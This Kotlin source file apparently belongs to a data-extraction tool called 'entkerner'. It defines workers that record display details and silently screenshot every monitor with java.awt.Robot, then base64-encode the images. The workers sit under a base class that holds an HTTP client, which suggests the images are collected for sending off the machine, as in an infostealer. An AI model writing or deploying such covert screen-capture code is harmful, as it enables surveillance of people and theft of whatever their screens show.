package net.kerner.entkerner.extractors.screen

import io.ktor.client.*
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.abstract.SystemFileURI
import net.kerner.entkerner.io.nullPaths
import net.kerner.entkerner.io.toBase64
import java.awt.GraphicsEnvironment
import java.awt.Rectangle
import java.awt.Robot
import java.awt.image.BufferedImage
import java.io.File

class ScreenExtractionWorker(ioClient: HttpClient) : AbstractDataExtractor<List<ScreenData>>(ioClient) {
    override val name: String = "ScreenDataExtractionService"
    override val fileDirectories: SystemFileURI = nullPaths

    override suspend fun extractData(file: File): List<ScreenData> {
        val graphic = GraphicsEnvironment.getLocalGraphicsEnvironment()
        return graphic.screenDevices.map { screen ->
            ScreenData(
                    width = screen.displayMode.width,
                    default = GraphicsEnvironment.getLocalGraphicsEnvironment().defaultScreenDevice == screen,
                    height = screen.displayMode.height,
                    refreshRate = screen.displayMode.refreshRate
            )
        }
    }
}

class ScreenScreenshotWorker(ioClient: HttpClient) : AbstractDataExtractor<List<BufferedImage>>(ioClient) {
    override val name: String = "ScreenScreenshotExtractionService"
    override val fileDirectories: SystemFileURI = nullPaths

    override suspend fun extractData(file: File): List<BufferedImage> {
        val robot = Robot()
        return GraphicsEnvironment.getLocalGraphicsEnvironment().screenDevices.map { screen ->
            robot.createScreenCapture(Rectangle(screen.displayMode.width, screen.displayMode.height))
        }
    }

    override suspend fun <V : Any> handleExtractedData(data: List<BufferedImage>): V {
        return data.map(BufferedImage::toBase64) as V
    }
}